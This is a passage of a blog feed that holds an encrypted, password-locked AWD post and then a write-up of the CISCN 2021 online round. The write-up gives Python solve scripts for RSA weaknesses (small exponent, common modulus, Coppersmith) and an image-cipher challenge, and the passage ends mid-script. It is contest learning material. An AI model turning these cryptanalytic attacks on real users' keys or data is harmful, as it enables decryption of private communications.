c3de6b696bc34ebd1bdc28b57dbaa430423c40d29374dd822a21dfacadfc975b3766ef41b7deabe1e5fc159abdef4215578111facea40ca6e4a039f2183e97373240bc0f9e4409388dde351ce62fa7100c8ba0b2be61d868f2b629130237ab9f684619f48b06a2ba751e0547f95bf05208c648d233d77c011c1ce10a936169b797ac7a6a75261e0f5ce21638218b6ed556a5f127fd4c8dd8f4eac99295317f314e8b56224e1119bb9f8a1b8130f3e41b13da02e4acac2638f779c06a3e9a21685376a789947306af012964184bfd72a91de0b5d17d4ccdd0cde7cb336d6c18556c6acfa9f837005e85f49eae80a3ff0b3185c7a83ebcb8a3456435d28eab0f9551b05056767b1a68f8701d055b1aa1ac8b1eab29ad98c1c1ad9c9f2ebdd547da5bcd24d39617ea51ad82b0205b83b47b59dbb76d62847053bd2e744001c9edc30c176d920c5cd302aafbc76887d9df5ce870b4afc93185191c8c02da456f6f363cc3342bb58cd0935d42f02f2ebcbe23144ea4fdb1ee66d9e21bfc688eafd33994915e79796b3143be108a7c0eee3a57ea0079390be3b81edac7b7933b4e70d9cf4195efd5cb60262f960509b671f44eca56b97797aab2c24a87512219d0b1e69fc350e9e0e4ccdd273eee85a5f5674d322eafa6da3335cdeb20e71082f1edd42235022c31779e1a442e8ba5292c3e67d820a707dddcc28ff1ffe824ae2dad41faf777df4f92d4178aff76f5f9c92c07205ea77becb0602dd3c5bf86a42f04a7cc0743b4aadaed94a699930fc33b8f2fbf07efbd81840ee133de0c5096bf49d38a3a98bcc807961f69443ca98d8cea0b68a8e6e15a517a8c16f82b1e3b2a4a10edb9e2d489411fa45afced57bf255c17b5b01d7051726177cce47bc8e29e79dd7384787ca80df6244b183fcf828bd5caff0200a26f1b61b9fecba6032d681a32d611eb51059a515f58a0ec84ea4581582c3c5884e08a829b89f9e0867bbceaf1ff4523d7fb20b3f8749b8b79fe47bd3adf8ec9302989f529229efef3c8d62bb72181b76a0adc7c35d496b0cb296aae4287fef945616812921c4389c91dc0b6377353d9f952e87f42a8a36c6aee867696a91e6248926e157c24b8c3d483b09fdaf461d594e9cef44fd724224ef3ee02e192002d00439e65172d6aae781f10b75510f2620f0b85a86fea07beb52c6bb7da60693090407f41a69ab1f37056cbead277f9235f2eb021067968ee63fa79933f1d27791e44c6cf19841cc68138b6056bbe9222f37e4d04baa562a2780192f7f1225903da7c961d64d2924e7855db646b74b8af1b8ce10821974cfdb09977167b589b962966366470b3157cd260c040e909464bf0b457907cad3bc719d990a91f0a7ec00ad3b43c7844f7d24985628598ec3afc58a4880e9c9d1a564155a7b94c5df77d46bb7d72d37fa6f23d8271b9eb1897af9b2bbdc1fad2770802efd988aa3430b61b0ad03402c2a6b795086a565ac2b4cf52c1f596c9878d2e54e6f0fc78d4f9e4d677164cc340b7488c81be3cf174dcbcf8a52c6a567af61645cadd8e4a4b2ed4177614897e98e99fc86afc06d6766691753d8124177b75f10bcc76cba8cfd6c065a80c1ec8f9ac3801a15ac11f9c31c903adb87e3bb9b74fd93691b9365b574bfbfd28eb4db95bbf39e3a4a5ac3a0c1352299c688d472ef0f8d4a9a6c9b6e1f4232867328e88b4ac7a9fd867b557d3dfe15a3be224c287c58bab129c8e0e5cfdcddd9e4ab7ee232afec74c169292a297986be80a3b1ccff870f595ffa2a082b0ef90d873a9ab1545b2006c99cfe91110bbb5749f488253b3895f5d5adcd3ffccffd339f71ae877fad7800f4c9503151983132b4660ee0137c170747df401a56251a5b020781d27f4d21f9fde7fd9c5ca4f7143670e51c292eba3764c8befab78e2db7fc203f082fc2044f2197a0f0a0a8dc998f5d2e05130a735d2417dd5e649b78108196bbeed6a905f90d526809bd3e0967e9e38244d61ba2415300f05612a91a03deb25f65a8257c2f7740292a38bb9fd23b649871486efa80cdfdf60bdd86683c72a8bcedca1880c1cff8a9215b2d46631c299b3702bc1e798a13d460413ee41f210fac1d672214de1f578167709cc05ae6114b8093a28e3a49a577befcd5faed30f881c38712c3cb7b7b7834beddc594a40126d0529d117e7e9918a5dd3ef087ed2dcef850d812d33549d48022bf46ddf7dcb5b28cf97109a35ccb790a43c0e318896bcb6be6ff5b1c80156a2083bb4d9bd2143d54b5e90c98a959f9428a3bd8deadf0a68637b7fc3d3eddf163a9399b6f77e2c604e5ac7cb2835d2b108ba0ea28ba0170daf4fc535658c1591857f5724a28bd43c42f784f1b0072fe0f0c047587a742384786795621be561b86d9e8e2488333299728c6fa22bf5cdb7180c45b290e56a435936a4221f0e919ab1f5955c4e6168b1f32229f2dee9c3b82074f1ba852b0c6ca841f358c90fc0c20aed9f38843f966b828c6f195da2677e12f0a90a330d748edf90f091e5f98e12aebbe33ccdfa783d5e0473bb815c0117b8d06c0ec6d1dc5118b5e625dd517717251cb6fa3c023c6d1dc657503859f57d5443357a1312eca3da3a46c7fc15c1dd8884e94091cf2d633293a5ae59b3ca3b9a32ce40abe7ceae17d69de0f534d45a472f46f5acb2ad1137c666f77ad9114299c1f05bb759d01d10355524116864a790ec8dd8c2a29600585bc640d11f06817fe43f192a58a97f9ed83c4852a5e056d47ca8950e77fa79d03c44e806e8d2859ec7a4b5285e5e2b8aa8a0c842cf25fd2b31e6220e9734d441df55265a17cd6f6e7e4647f47f5a096a7e448703ab4d25df0d0eacd5f7b6138e1bfcc47536eba404ae4397609afe231125bf779ec8602f8864cb323534a646331dadd90889b441f43e196c30babc1bfe2108a67efe82525db7a55c41968d0c53e443f65ad8ae9888241ec9b040d1abcbb02f92feab6cb2209d0079287a2b203d896b30852605967eb2396cc977a5ca58f7fe8c63bef0257a956222ef2fdd20431cf7d05efe493520fb185936e1b7e4231b009250c8596530e6b80caa98b5a20880d3ec1a2679333377d94f946ec18c9d0ef72b9547be7593dd8977776d92fb801564d9b531e9b55ed0665b0216894a8eb19395218ed3f41f3f00b951a09a3488d585d12a69c695faa9c17ad7815d25058adff8d0df2b1c322b715b465a2de704f5f35b6acef65aaf09bbdb10c3266bd144c7ab61b8877f85eb75616ccab670c8e44505f66672909ef604778aa3d04e74ee1b826617c5182a4b56a6d555cf2a47323a2e53db5d56aa95203546a37f49ffd930d61fbe53ac87837d3cc06f91b8f6c90997f1ab0e8288d622ced01326508634581a2253f4494ee132c8b68ca75876f52d6cc5ce0b51da855f9c75e079cd073f1932e5010f21f3142688d5c7b2e3ee6ef84d3abb0be6f4121c317b932e9ecdb253fd2f45334d7572b7a5b9739c00bc1e5fe16009403e489786304a4dd1b9dee5fd80418b1b2f2f71422e363e787614520fb8ae5a34adc9c95845901ea722dce56cbfa2f27964dc2d2315d89068786551f79097da6bf3ffca7ae2b557d2d4f4968f2382f002a22c4660b75a8604a43aa3e554153a3369a2a8e9043ec15afcbc8a2dfbb67c9263586dd244644489294c381985cb34b8f41facd567df405afe6a7fc36c3f5a75472752726b83dd811dfefd280c1e06de0b4e2e87c3c70ab320ea00bdb605137c2daae27163215d4464ea778ea2e24f51376093c1054171d5c00fb5b0ca391d5a416c9dfdcb1a32944b820dd82302fdff8760a0fad55061d9f6a49c52ed3d134838ab22372e655e33f9a5d7a4c17993ccacc722046355c6f92e3ad664c73bd3f0d71a790482a6add2446daabd7fcc1f8fd027f47e1dc7f4e09124c23b9b1ba001d00b1d8fa4dccaa6750bb17701799bdcbf5a7b96766eeb9272903b729ec81696c076fee0442705cddb9a5ef551e375eeb25fa657e6fd57705f27ce6f5624447c26774ac576365ead2f7ae55dfcd8ddb7cd899f7bc7f7464992768525fc4f1c3bfd948b8b3f24296df333e39f310c06538a668b2c12e7fb31325d75605c7425583e9d5116ca0036e8556a93ec650caf0dd030e037f19fbffebb628006e1106078252dfaad9557d43ec556d006907b222fcfda135a0c325ae1770822ae7d43203ba4a915b11efd788ab21480a37f9fabeec1cd886cea23bd57c1147d7b1f52d32882f76180f33cd01cd990360752aa885c8225797381e596518384ddc9185b1710859a4364564089db1ea84473100529bb068ff4b18cc0dc059af373c907511ccef7c0aafb3d7105396dbb3c909333100b7fe99a12e35fd607733d5efa903f14536a1b51c76ae59b08f065dcd565ff4ca368c905e48d53b304974d7bf0cbfa8c4b4647cbaaa91f014ea8575f70222b2cccb58e9a637e505c13442aeb83237029996d5b2b09e6554d9a4398d4d0c84e103be14f62a262acf0e04a1a35a9cffe986ee5eea6861c90859297886d7159a502a6ab22d060ebc6e82afb940370afc89fabe73682bb902a5b221beafc24a3f5eaf1a4bcd99798ecbb010c6689a111f64656e30edf323db1562f94e91b977bc4bf03a377ffcd85b4ea40fa54415f8db2ae588f993418ebd330863bf26122c425f70c134343751683b5c203e6d44c8656ed795bba615cf4b7ea5375232899e7cd376e34233a8ede033856548819293c5dfdce74b4348c60aaa24c044daf43a17567d64475c46ecd8f591e78448a2cbf8e84c7b6b8f763761996429cd844f9e7c4f24aae269c71703dd8bc655bf9ab08aad783110c6aa508748d51a8bca25741f5ebd6c0fa82572cc500c2c3b9b83dabaea578d69cf746fda801fb246800392fa6bad42d87d7fb1c399e1b342437204fbf5592fc382dbe3e5bf747b511aaad18b38231092cfd22ad8917ee4ec669a3fab965b8073bddcc9990d0c252cfbcbae95c4b47f517f435cb88994c449f66633fa8694c4e54271f0354757bfae8e2ea4e72caf2b4c3bfabad31f35a845a8c972d70a514f4eb4da4c22c276b33ca8100ee5d17a6a358cb6cd80791c95ac8a79f4cfb167e0f5df6c9a97b2a4410f23612606a1d8fddebaa84dc3baf63c5b661480deb005055c1f12799ee26e827498d3c19fc135103a6207698124af68f735dbf49e890842c660e990a83df74c1d2c76c2815c1ae0db929b0242ae8752b5802b92447a7b404d85833832d7623658ae3516f6f25695588de222661899516ec1182f48b9f4dc6004f1e24a269bd66ad393c31614895ee0de52fc7bc07885979581cc4fa46ef55cf846cfe868bfdceb7817eb102a525ddeb19743fb63c732ece5f97959f5fda78e0b5a4b6c2c5c93b748593c2c26fdfb6b2635aec90ad349185e07fd88f36fe48638c4f04cef5ae7dba76342dea1efe872ac41f077ff2b80c81708602d860477fd0072f2db0c69b2a986cda28183e0b40eeb5bd2c5d4faa994e66044cce884ec3a9ba9a669866a721e363e632fdd15ad45c0ec39b984d72559056bc1484ef8f8eb0bf004dfaefd2ce2a9062423f9850e7ebef80acc5498ce13b52ab0a0a67d59ae7545b6e96aa5dff69ccb78c3cb586a82def6f774596d2b1f4f571a43b6bfc34134d403ee51e3b5740ce2bb932de07747d6745016faeb2f134a47c3db57a3fffa0bbadb9567deab81e3ba5f0fa8945332b4b50419518e620088c3aefc06d68981f023d598e3928edf94230f6b7d6ba875be06adfc397429e2c696e6757a7ad1dfc375adb890d1a8085ab192bf12c96774dc59b9eb41cf01e4af007f2eeb2b7ecbec0efb8c2bd78e2fce89604b95ae1239e43834043f5aa4a1e7b921da5bb5448e9d52747210adee1b151203389cd67a94169df5e8de05df9f756bb0d8a6a0c91d8f3131829933098db278d05911ee869eabdf1f759de98f4e1636f8bef5ae964c7f6eaf1b1fb5b7303313b18756ef304c71bfdcf98140429</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Please enter password to read.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Please enter password to read.</summary>
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>First AWD at ciscn2021</title>
    <link href="http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/"/>
    <id>http://example.com/2021/06/20/Frist_AWD_at_ciscn2021/</id>
    <published>2021-06-20T04:51:30.000Z</published>
    <updated>2021-06-20T06:39:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="祭第一次国赛-x2F-第一次AWD"><a href="#祭第一次国赛-x2F-第一次AWD" class="headerlink" title="祭第一次国赛&#x2F;第一次AWD"></a>祭第一次国赛&#x2F;第一次AWD</h1><p>华东北太卷啦太卷啦</p><h2 id="线上初赛"><a href="#线上初赛" class="headerlink" title="线上初赛"></a>线上初赛</h2><p>360搁这给我高考呢是不，一卷二卷三卷发来发去收来收去的，非要让人肝到凌晨三点</p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="classic"><a href="#classic" class="headerlink" title="classic"></a>classic</h4><p>谜语人给爷死</p><ul><li>ADFGX密码</li><li>表<code>phqgmeaynofdxkrcvszwbutil</code></li><li>key <code>classic</code></li><li>密文反过来</li></ul><h4 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h4><p>Level1<code>e=3</code>，Level2<code>exgcd</code>，Level3<code>coppersmith</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c1 = <span class="number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span></span><br><span class="line">n1 = <span class="number">123814470394550598363280518848914546938137731026777975885846733672494493975703069760053867471836249473290828799962586855892685902902050630018312939010564945676699712246249820341712155938398068732866646422826619477180434858148938235662092482058999079105450136181685141895955574548671667320167741641072330259009</span></span><br><span class="line">e1 = <span class="number">3</span></span><br><span class="line">m1 = iroot(c1,e1)[<span class="number">0</span>]</span><br><span class="line">msg1 = long_to_bytes(m1)</span><br><span class="line"><span class="built_in">print</span>(msg1)</span><br><span class="line"></span><br><span class="line">n2 = <span class="number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span></span><br><span class="line">e2 = <span class="number">17</span></span><br><span class="line">e3 = <span class="number">65537</span></span><br><span class="line">c2 = <span class="number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span></span><br><span class="line">c3 = <span class="number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span></span><br><span class="line">gcd,a,b = gcdext(e2,e3)</span><br><span class="line"><span class="keyword">if</span>(a &lt; <span class="number">0</span>):</span><br><span class="line">    c2 = inverse(c2,n2)</span><br><span class="line">    a = -a</span><br><span class="line"><span class="keyword">if</span>(b &lt; <span class="number">0</span>):</span><br><span class="line">    c3 = inverse(c3,n2)</span><br><span class="line">    b = -b</span><br><span class="line">m2 = <span class="built_in">pow</span>(c2,a,n2) * <span class="built_in">pow</span>(c3,b,n2) % n2</span><br><span class="line">msg2 = long_to_bytes(m2)</span><br><span class="line"><span class="built_in">print</span>(msg2)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line"><span class="string">p0 = 7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902&lt;&lt;200</span></span><br><span class="line"><span class="string">kbits = 200</span></span><br><span class="line"><span class="string">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="string">f = x + p0</span></span><br><span class="line"><span class="string">f = f.monic()</span></span><br><span class="line"><span class="string">x0 = f.small_roots(X=2^kbits, beta=0.4)[0]</span></span><br><span class="line"><span class="string">p = x0 + p0</span></span><br><span class="line"><span class="string">print(p)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">c3 = <span class="number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span></span><br><span class="line">n3 = <span class="number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span></span><br><span class="line">p3 = <span class="number">11437038763581010263116493983733546014403343859218003707512796706928880848035239990740428334091106443982769386517753703890002478698418549777553268906496423</span></span><br><span class="line">q3 = n3 // p3</span><br><span class="line"><span class="keyword">assert</span> p3*q3 == n3</span><br><span class="line">phi3 = (p3-<span class="number">1</span>) * (q3-<span class="number">1</span>)</span><br><span class="line">d3 = inverse(e3,phi3)</span><br><span class="line">m3 = <span class="built_in">pow</span>(c3,d3,n3)</span><br><span class="line">msg3 = long_to_bytes(m3)</span><br><span class="line"><span class="built_in">print</span>(msg3)</span><br><span class="line"></span><br><span class="line">msg = msg1 + msg2 + msg3</span><br><span class="line">flag = <span class="string">&quot;CISCN&#123;&quot;</span>+(md5(msg).hexdigest())+<span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="imageencrypt"><a href="#imageencrypt" class="headerlink" title="imageencrypt"></a>imageencrypt</h4><p>首先因为<code>a^b=~a^~b</code>，用两个cipher和一个simple求出plain的前256位，接着再用一组对应的明文和密文求出key的可能配对还原出还原出bins之后去算xlist，接着算r，找到差距最小的基本上就是r的取值了由于精度损失，我们如果得到准确的x值较为困难，所以选择爆破x0，key1 key2 x0 r都已知，对cipher2再加密一次即可得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">temp = []</span><br><span class="line">cipher1 = []</span><br><span class="line">cipher2 = []</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;out&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    temp.append(<span class="built_in">int</span>(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher1.append(<span class="built_in">int</span>(i))</span><br><span class="line">data = f.readline()[<span class="number">1</span>:-<span class="number">2</span>].split(<span class="string">&quot;, &quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    cipher2.append(<span class="built_in">int</span>(i))</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(temp) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher1) == <span class="number">16</span> * <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(cipher2) == <span class="number">24</span> * <span class="number">16</span></span><br><span class="line"></span><br><span class="line">plain = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    plain.append(temp[i] ^ cipher1[i] ^ cipher2[i])</span><br><span class="line"></span><br><span class="line">dic = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    ans = temp[i] ^ cipher1[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line">    ans = plain[i] ^ cipher2[i]</span><br><span class="line">    <span class="keyword">if</span>(ans <span class="keyword">not</span> <span class="keyword">in</span> dic):</span><br><span class="line">        dic[ans] = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dic[ans] += <span class="number">1</span></span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = 1.2</span></span><br><span class="line"><span class="comment"># key_pair = (78 or 177) &amp; (86 or 169)</span></span><br><span class="line">key1 = <span class="number">169</span></span><br><span class="line">key2 = <span class="number">78</span></span><br><span class="line"></span><br><span class="line">bin_x = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key1)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~temp[i] ^ key2)&amp;<span class="number">0xff</span> == cipher1[i]):</span><br><span class="line">        bin_x += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_x)</span></span><br><span class="line"></span><br><span class="line">bin_xx = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>*<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">if</span>((plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;00&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key1)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;10&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span>((~plain[i] ^ key2)&amp;<span class="number">0xff</span> == cipher2[i]):</span><br><span class="line">        bin_xx += <span class="string">&#x27;11&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ERROR&quot;</span>)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># print(bin_xx)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> bin_x == bin_xx</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bin_x)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bin_xx)%<span class="number">16</span> == <span class="number">0</span></span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(bin_x)//<span class="number">16</span>):</span><br><span class="line">    <span class="comment"># print(i)</span></span><br><span class="line">    x = <span class="built_in">int</span>(bin_x[i*<span class="number">16</span>:i*<span class="number">16</span>+<span class="number">16</span>],<span class="number">2</span>)</span><br><span class="line">    data = <span class="built_in">round</span>(x/<span class="number">22000</span>,<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">int</span>(data*<span class="number">22000</span>) == x):</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(data-<span class="number">0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span class="line">        data = <span class="built_in">round</span>(data-<span class="number">0.000001</span>,<span class="number">6</span>)</span><br><span class="line">        x_list.append(data)</span><br><span class="line">    <span class="keyword">elif</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(data+<span class="number">0.000001</span>,<span class="number">6</span>)*<span class="number">22000</span>) == x):</span><br><span 